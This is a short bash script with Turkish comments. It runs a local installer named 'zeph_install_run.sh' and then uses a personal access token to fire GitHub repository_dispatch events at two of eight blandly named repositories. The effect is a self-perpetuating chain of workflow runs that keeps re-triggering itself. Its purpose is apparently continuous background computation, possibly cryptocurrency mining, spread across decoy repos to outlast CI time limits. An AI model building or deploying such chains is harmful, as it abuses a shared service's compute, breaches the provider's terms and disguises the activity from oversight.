#!/bin/bash

# --- 1. ÇALIŞTIR ---
echo "Worker Prime Başlatılıyor..."
chmod +x zeph_install_run.sh
./zeph_install_run.sh

# --- 2. GÖREV DEVRİ (TRIGGER) ---
echo "✅ Görev tamamlandı. Sıradaki ekip çağırılıyor..."

USER_NAME="tosunhalil924-lang" # Senin GitHub Kullanıcı Adın

# Hangi ID çalıştıysa sonrakileri belirle
case $WORKER_ID in
  1|2) N1=3; N2=4 ;;
  3|4) N1=5; N2=6 ;;
  5|6) N1=7; N2=8 ;;
  7|8) N1=1; N2=2 ;;
  *) N1=1; N2=2 ;; # Hata durumunda başa dön
esac

REPOS=("Atlas-Core-System" "Helios-Data-Stream" "Icarus-Sync-Node" "Hermes-Relay-Point" "Ares-Flow-Control" "Zeus-Buffer-Cloud" "Apollo-Logic-Vault" "Athena-Task-Manager")

REPO1=${REPOS[$((N1-1))]}
REPO2=${REPOS[$((N2-1))]}

trigger() {
  local target=$1
  local id=$2
  echo "Tetikleniyor: $target (ID: $id)"
  curl -X POST -H "Authorization: token $PAT_TOKEN" \
       -H "Accept: application/vnd.github.v3+json" \
       "https://api.github.com/repos/$USER_NAME/$target/dispatches" \
       -d "{\"event_type\": \"prime_loop\", \"client_payload\": {\"worker_id\": \"$id\"}}"
}

trigger "$REPO1" "$N1"
trigger "$REPO2" "$N2"

echo "👋 Görüşürüz!"
